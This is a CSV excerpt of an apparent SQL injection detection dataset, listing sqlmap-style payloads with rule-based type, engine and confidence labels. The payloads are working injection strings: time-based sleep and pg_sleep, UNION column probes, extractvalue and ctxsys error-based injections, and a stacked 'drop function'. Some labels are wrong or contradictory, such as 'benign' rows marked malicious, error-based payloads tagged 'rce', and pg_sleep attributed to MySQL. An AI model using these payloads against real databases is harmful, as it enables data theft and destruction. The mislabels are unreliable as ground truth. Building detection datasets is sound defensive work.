row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6810,"select * from generate_series ( 3086,3086,case when ( 3086 = 3327 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
6811,if ( 3245 = 6168 ) select 3245 else drop function nafj--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
6812,"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6813,1'+ ( select xzse where 4530 = 4530,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6814,1 ) where 7165 = 7165 and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6815,1' ) where 3588 = 3588,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6816,"1' where 2391 = 2391 union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6817,"1"" ) as lgxc where 1117 = 1117 union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6818,1%' ) and sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6819,"1%' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6820,"1' union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6821,"1, ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6822,"1'|| ( select 'lstx' from dual where 2972 = 2972 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",1,,heavy_query,oracle,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on oracle",rule-based
6823,1 where 2649 = 2649 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6824,"1%"" ) ) union all select null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6825,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'aiuy' = 'aiuy",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6826,-4557%' ) ) or 4537 = 3401 and ( ( '%' = ',1,,boolean_blind,generic,0.95,4537 = 3401 and detected — boolean_blind injection (priority 8) on generic,rule-based
6827,1'+ ( select idnb where 2338 = 2338,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6828,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'aduc' = 'aduc",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6829,"1%"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
6830,"1%' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( '%' = '",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6831,"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--",1,,boolean_blind,generic,0.95,8041 = 8041 and detected — boolean_blind injection (priority 8) on generic,rule-based
6832,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'ywbs' = 'ywbs,1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
6833,-7442 ) or 3391 = 7492,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
